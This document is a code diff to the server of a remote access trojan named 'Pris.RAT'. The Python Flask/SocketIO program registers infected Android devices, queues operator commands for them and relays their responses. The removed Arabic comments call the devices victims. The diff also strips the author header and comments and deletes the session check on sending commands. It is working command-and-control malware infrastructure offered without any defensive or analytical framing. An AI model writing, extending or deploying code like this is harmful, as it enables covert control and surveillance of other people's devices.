@@ -1,7 +1,5 @@
-"""
-Pris.RAT - C2 Server
-Author: mkgg449-dotcom
-"""
+from gevent import monkey
+monkey.patch_all()
 
 from flask import Flask, render_template, request, redirect, session, jsonify
 from flask_socketio import SocketIO, emit, join_room
@@ -16,11 +14,11 @@ SECRET_KEY = os.environ.get("SECRET_KEY", "pris_rat_secret_2026")
 # ============ APP ============
 app = Flask(__name__)
 app.secret_key = SECRET_KEY
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
+socketio = SocketIO(app, cors_allowed_origins="*")
 
 # ============ STORAGE ============
-devices = {}  # { device_id: {info} }
-commands_queue = {}  # { device_id: [commands] }
+devices = {}
+commands_queue = {}
 
 # ============ ROUTES ============
 @app.route("/")
@@ -80,7 +78,6 @@ def on_disconnect():
 
 @socketio.on("register")
 def on_register(data):
-    """APK الضحية يسجل نفسه"""
     device_id = data.get("id", str(uuid.uuid4())[:8])
     devices[device_id] = {
         "id": device_id,
@@ -99,7 +96,6 @@ def on_register(data):
 
 @socketio.on("heartbeat")
 def on_heartbeat(data):
-    """الـ APK يبعت نبضة كل 30 ثانية"""
     device_id = data.get("id")
     if device_id in devices:
         devices[device_id]["online"] = True
@@ -108,14 +104,10 @@ def on_heartbeat(data):
 
 @socketio.on("send_command")
 def on_send_command(data):
-    """من لوحة التحكم → للضحية"""
     target = data.get("target")
     action = data.get("action")
     if not target or target not in devices:
         emit("error", {"msg": "device not found"})
-        return
-    if "user" not in session:
-        emit("error", {"msg": "unauthorized"})
         return
     cmd_data = {
         "action": action,
@@ -127,7 +119,6 @@ def on_send_command(data):
 
 @socketio.on("response")
 def on_response(data):
-    """من الضحية → للوحة التحكم"""
     device_id = data.get("id")
     socketio.emit("device_response", data, broadcast=True)
     print(f"[←] Response from {device_id}: {data.get('type')}")
